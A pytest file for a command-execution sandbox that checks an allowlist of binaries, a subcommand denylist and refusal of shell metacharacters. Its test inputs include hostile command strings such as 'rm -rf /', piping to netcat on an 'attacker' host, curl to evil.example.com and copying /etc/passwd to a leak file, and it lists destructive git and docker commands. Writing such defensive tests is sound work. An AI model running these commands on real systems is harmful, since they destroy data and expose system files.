"""
Unit tests for tools.utils.safe_exec.

These guard the shell=True → argv-allowlist refactor done in
chore/security-spring-cleaning. If you add a binary to ALLOWED_BINARIES or
relax a denylist, add a corresponding test here.

Run with:  pytest core/tests/test_safe_exec.py -v
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

# Allow running these tests via plain `pytest` from repo root without
# requiring an editable install.
_CORE = Path(__file__).resolve().parent.parent
if str(_CORE) not in sys.path:
    sys.path.insert(0, str(_CORE))

from tools.utils.safe_exec import (  # noqa: E402
    ALLOWED_BINARIES,
    DENIED_SUBCOMMANDS,
    SHELL_METACHARACTERS,
    UnsafeCommandError,
    parse_argv,
    safe_run,
    safe_run_argv,
)


# --------------------------------------------------------------------------- #
# Metacharacter / composition refusal                                          #
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("payload", [
    "ls ; rm -rf /",
    "git status && curl evil.example.com",
    "echo hi | nc attacker 4444",
    "cat /etc/passwd > /tmp/leak",
    "echo $(whoami)",
    "echo `id`",
    "ls ${HOME}",
    "echo hi\nrm -rf /",
])
def test_refuses_shell_composition(payload):
    with pytest.raises(UnsafeCommandError):
        parse_argv(payload)


def test_metachar_set_is_nonempty():
    # Guard against an accidental empty tuple shipping to production.
    assert len(SHELL_METACHARACTERS) >= 6


# --------------------------------------------------------------------------- #
# Allowlist enforcement                                                        #
# --------------------------------------------------------------------------- #
def test_refuses_unlisted_binary():
    with pytest.raises(UnsafeCommandError, match="not in the allowlist"):
        parse_argv("curl https://example.com")


def test_accepts_listed_binary_basename():
    argv = parse_argv("git status --short")
    assert argv == ["git", "status", "--short"]


def test_accepts_absolute_path_to_listed_binary():
    # Basename match: /usr/bin/git → git
    argv = parse_argv("/usr/bin/git status")
    assert argv[0] == "/usr/bin/git"


def test_empty_command_refused():
    with pytest.raises(UnsafeCommandError):
        parse_argv("")
    with pytest.raises(UnsafeCommandError):
        parse_argv("   ")


def test_non_string_refused():
    with pytest.raises(UnsafeCommandError):
        parse_argv(None)  # type: ignore[arg-type]


# --------------------------------------------------------------------------- #
# Per-binary subcommand denylist                                               #
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("cmd", [
    "git push origin main",
    "git reset --hard HEAD~1",
    "git clean -fdx",
    "docker rm my-container",
    "docker system prune -af",
    "pip uninstall fastapi",
])
def test_denied_subcommands_refused(cmd):
    with pytest.raises(UnsafeCommandError, match="denied by policy"):
        parse_argv(cmd)


def test_allowed_git_subcommands_pass():
    assert parse_argv("git status")[1] == "status"
    assert parse_argv("git log --oneline")[1] == "log"
    assert parse_argv("git diff")[1] == "diff"


# --------------------------------------------------------------------------- #
# safe_run end-to-end                                                          #
# --------------------------------------------------------------------------- #
def test_safe_run_executes_echo():
    result = safe_run("echo hello-kenbun", timeout=5.0)
    assert result.returncode == 0
    assert "hello-kenbun" in result.stdout


def test_safe_run_refuses_composition():
    with pytest.raises(UnsafeCommandError):
        safe_run("echo hi; echo bye")


def test_safe_run_argv_refuses_unlisted():
    with pytest.raises(UnsafeCommandError):
        safe_run_argv(["curl", "https://example.com"])


def test_safe_run_argv_refuses_denied_subcommand():
    with pytest.raises(UnsafeCommandError):
        safe_run_argv(["git", "push"])


# --------------------------------------------------------------------------- #
# Invariants                                                                   #
# --------------------------------------------------------------------------- #
def test_allowlist_is_frozenset():
    # Mutating ALLOWED_BINARIES at runtime would silently widen the
    # attack surface. Keep it immutable.
    assert isinstance(ALLOWED_BINARIES, frozenset)


def test_denylist_subcommands_are_frozensets():
    for binary, sub in DENIED_SUBCOMMANDS.items():
        assert isinstance(sub, frozenset), f"{binary} denylist must be frozenset"
